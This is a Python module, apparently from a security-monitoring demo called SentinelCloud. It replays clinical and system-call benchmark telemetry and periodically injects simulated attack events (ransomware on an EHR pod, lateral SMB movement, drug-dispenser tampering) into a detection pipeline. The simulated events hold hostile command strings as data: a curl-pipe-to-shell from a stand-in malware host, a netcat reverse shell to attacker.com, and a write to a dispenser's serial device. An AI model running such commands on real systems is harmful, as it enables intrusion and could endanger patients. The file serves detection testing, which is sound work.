"""
SentinelCloud Live Telemetry & Attack Generator
================================================
Generates continuous, realistic clinical microservice telemetry at variable rates,
and executes periodic cyber-attack scenarios at variable intervals.
"""

import os
import sys
import json
import time
import random
import threading
import logging
from typing import Optional, Dict, List, Any

from backend.core.event_schema import TelemetryEvent, TelemetrySource, DataMode, ServiceStatus

logger = logging.getLogger("sentinel.live_generator")

# ── Load Real Benchmark Dataset (ADFA-LD & MIMIC-III) ──

def _load_benchmark_dataset() -> tuple[Dict[str, Any], List[Dict[str, Any]]]:
    """
    Load curated internal traffic dataset derived from ADFA-LD (UNSW Canberra)
    and MIMIC-III (MIT PhysioNet).
    """
    possible_paths = [
        os.path.join(os.path.dirname(__file__), "..", "..", "datasets", "internal_traffic_dataset.json"),
        os.path.join(os.getcwd(), "datasets", "internal_traffic_dataset.json"),
        os.path.join(os.path.dirname(__file__), "internal_traffic_dataset.json"),
    ]
    for path in possible_paths:
        abs_path = os.path.abspath(path)
        if os.path.exists(abs_path):
            try:
                with open(abs_path, "r", encoding="utf-8") as f:
                    data = json.load(f)
                    meta = data.get("metadata", {})
                    records = data.get("records", [])
                    if records:
                        logger.info(
                            "Loaded %d real benchmark records from %s (Sources: ADFA-LD & MIMIC-III)",
                            len(records), abs_path
                        )
                        return meta, records
            except Exception as e:
                logger.warning("Could not parse dataset at %s: %s", abs_path, e)

    logger.warning("Dataset file not found at search paths; using baseline clinical dataset records.")
    return {}, []

DATASET_METADATA, DATASET_RECORDS = _load_benchmark_dataset()

# Export for backward compatibility and ML baseline seeding
CLINICAL_EVENTS = DATASET_RECORDS


class LiveTrafficGenerator:
    """
    Generates continuous live clinical telemetry by deterministically replaying
    curated traces from real-world cybersecurity & clinical benchmarks:
      - ADFA-LD (UNSW Canberra): Linux kernel system call traces
      - MIMIC-III (MIT PhysioNet): Intensive care physiological and medication records
    Executes periodic cyber-attack scenarios at variable intervals.
    """

    def __init__(self, pipeline):
        self.pipeline = pipeline
        self.running = False
        self.thread: Optional[threading.Thread] = None

        # Replay index for deterministic sequential replay (zero randomization)
        self.replay_index = 0
        self.records = DATASET_RECORDS

        # Attack interval configuration (variable 45 to 80 seconds)
        self.min_attack_interval = 45.0
        self.max_attack_interval = 80.0
        self.next_attack_interval = random.uniform(self.min_attack_interval, self.max_attack_interval)
        self.last_attack_time = time.time()

    @classmethod
    def get_dataset_metadata(cls) -> Dict[str, Any]:
        """Return dataset provenance metadata and source citations."""
        return {
            "dataset_name": DATASET_METADATA.get("dataset_name", "SentinelCloud Internal Benchmark: ADFA-LD & MIMIC-III"),
            "version": DATASET_METADATA.get("version", "1.0.0"),
            "description": DATASET_METADATA.get("description", "Curated real-world benchmark dataset for internal telemetry traffic."),
            "sources": DATASET_METADATA.get("sources", []),
            "replay_policy": DATASET_METADATA.get("replay_policy", {
                "mode": "deterministic_sequential",
                "randomness": "NONE (0.0% randomized values)",
            }),
            "total_records": len(DATASET_RECORDS),
        }

    def start(self):
        if self.running:
            return
        self.running = True
        self.last_attack_time = time.time()
        self.thread = threading.Thread(target=self._run_loop, daemon=True, name="LiveTrafficGenerator")
        self.thread.start()
        logger.info(
            "Live benchmark telemetry & attack generator started (Replaying %d records, Next attack in ~%.1fs)",
            len(self.records), self.next_attack_interval
        )

    def stop(self):
        self.running = False
        logger.info("Live telemetry generator stopped")

    def _run_loop(self):
        # Initial warm-up delay
        time.sleep(3.0)

        while self.running:
            try:
                now = time.time()

                # Check if it's time for an attack scenario
                time_since_attack = now - self.last_attack_time
                any_pod_under_attack = any(
                    s.status in (ServiceStatus.DEGRADED, ServiceStatus.QUARANTINED, ServiceStatus.REDEPLOYING)
                    for s in self.pipeline.services.values()
                )

                if time_since_attack >= self.next_attack_interval and not any_pod_under_attack:
                    self._execute_random_attack()
                    self.last_attack_time = time.time()
                    self.next_attack_interval = random.uniform(self.min_attack_interval, self.max_attack_interval)
                    logger.info("Next cyber-attack scheduled in ~%.1f seconds", self.next_attack_interval)
                else:
                    # Emit normal clinical telemetry event
                    self._emit_normal_event()

                # Variable rate: sleep between 1.2s and 2.8s
                sleep_time = random.uniform(1.2, 2.8)
                time.sleep(sleep_time)

            except Exception as e:
                logger.error("Error in live telemetry generator loop: %s", e)
                time.sleep(2.0)

    def _emit_normal_event(self):
        """
        Emit the next authentic event from the benchmark dataset.
        Replays deterministically in sequence without random selection.
        """
        if not self.records:
            return

        rec = self.records[self.replay_index]
        self.replay_index = (self.replay_index + 1) % len(self.records)

        # Avoid emitting normal events to a pod currently undergoing quarantine/redeploy
        pod_status = self.pipeline.services.get(rec["pod_name"])
        if pod_status and pod_status.status != ServiceStatus.HEALTHY:
            return

        event = TelemetryEvent(
            source=TelemetrySource.HTTP_INGESTION,
            data_mode=DataMode.LIVE,
            pod_name=rec["pod_name"],
            namespace=rec.get("namespace", "medical"),
            syscall_name=rec["syscall_name"],
            binary=rec["binary"],
            target=rec["target"],
            port=rec.get("port", 0),
            payload_size=rec.get("payload_size", 0),
            params=rec.get("params", {}),
            dataset_source=rec.get("dataset_source", "ADFA-LD & MIMIC-III Benchmark"),
            record_id=rec.get("record_id"),
            benchmark_ref=rec.get("benchmark_ref"),
        )
        self.pipeline.process_event(event)

    def _execute_random_attack(self):
        """Execute a multi-stage cyber attack scenario."""
        scenario_choice = random.choice(["ransomware_ehr", "lateral_billing", "firmware_dispenser"])
        logger.warning(">>> LAUNCHING PERIODIC CYBER-ATTACK SCENARIO: %s <<<", scenario_choice)

        if scenario_choice == "ransomware_ehr":
            self._attack_ransomware_ehr()
        elif scenario_choice == "lateral_billing":
            self._attack_lateral_billing()
        else:
            self._attack_firmware_dispenser()

    def _attack_ransomware_ehr(self):
        """Multi-stage ransomware kill-chain on EHR pod."""
        # Stage 1: Spawn unauthorized shell
        ev1 = TelemetryEvent(
            source=TelemetrySource.LAB_TEST,
            pod_name="ehr",
            namespace="medical",
            syscall_name="sys_execve",
            binary="/bin/bash",
            target="",
            params={"argv": ["/bin/bash", "-c", "curl -s http://malware.darknet.ru/drop.sh | sh"]},
        )
        self.pipeline.process_event(ev1)
        time.sleep(1.2)

        # Stage 2: Encrypt database records (.locked)
        ev2 = TelemetryEvent(
            source=TelemetrySource.LAB_TEST,
            pod_name="ehr",
            namespace="medical",
            syscall_name="sys_rename",
            binary="/bin/mv",
            target="/data/patient_records.db.locked",
            params={"old_path": "/data/patient_records.db", "new_path": "/data/patient_records.db.locked"},
        )
        self.pipeline.process_event(ev2)
        time.sleep(1.2)

        # Stage 3: Lateral SMB pivot
        ev3 = TelemetryEvent(
            source=TelemetrySource.LAB_TEST,
            pod_name="ehr",
            namespace="medical",
            syscall_name="sys_connect",
            binary="/usr/bin/smbclient",
            target="billing:445",
            port=445,
            protocol="tcp",
            params={"share": "C$"},
        )
        self.pipeline.process_event(ev3)

    def _attack_lateral_billing(self):
        """Lateral movement and unauthorized access on Billing pod."""
        # Stage 1: Unauthorized command execution
        ev1 = TelemetryEvent(
            source=TelemetrySource.LAB_TEST,
            pod_name="billing",
            namespace="medical",
            syscall_name="sys_execve",
            binary="/bin/bash",
            target="",
            params={"argv": ["/bin/bash", "-c", "nc -e /bin/sh attacker.com 4444"]},
        )
        self.pipeline.process_event(ev1)
        time.sleep(1.2)

        # Stage 2: Lateral port 445 SMB pivot to drug dispenser
        ev2 = TelemetryEvent(
            source=TelemetrySource.LAB_TEST,
            pod_name="billing",
            namespace="medical",
            syscall_name="sys_connect",
            binary="/usr/bin/smbclient",
            target="drug-dispenser:445",
            port=445,
            protocol="tcp",
            params={"share": "ADMIN$"},
        )
        self.pipeline.process_event(ev2)

    def _attack_firmware_dispenser(self):
        """Memory tamper and unauthorized device access on Drug Dispenser."""
        # Stage 1: Unexpected shell
        ev1 = TelemetryEvent(
            source=TelemetrySource.LAB_TEST,
            pod_name="drug-dispenser",
            namespace="medical",
            syscall_name="sys_execve",
            binary="/bin/bash",
            target="",
            params={"argv": ["/bin/bash", "-c", "echo 999 > /dev/ttyUSB0"]},
        )
        self.pipeline.process_event(ev1)
        time.sleep(1.2)

        # Stage 2: Device manipulation
        ev2 = TelemetryEvent(
            source=TelemetrySource.LAB_TEST,
            pod_name="drug-dispenser",
            namespace="medical",
            syscall_name="sys_rename",
            binary="/bin/mv",
            target="/data/infusion_calibration.conf.locked",
            params={"old_path": "/data/infusion_calibration.conf", "new_path": "/data/infusion_calibration.conf.locked"},
        )
        self.pipeline.process_event(ev2)
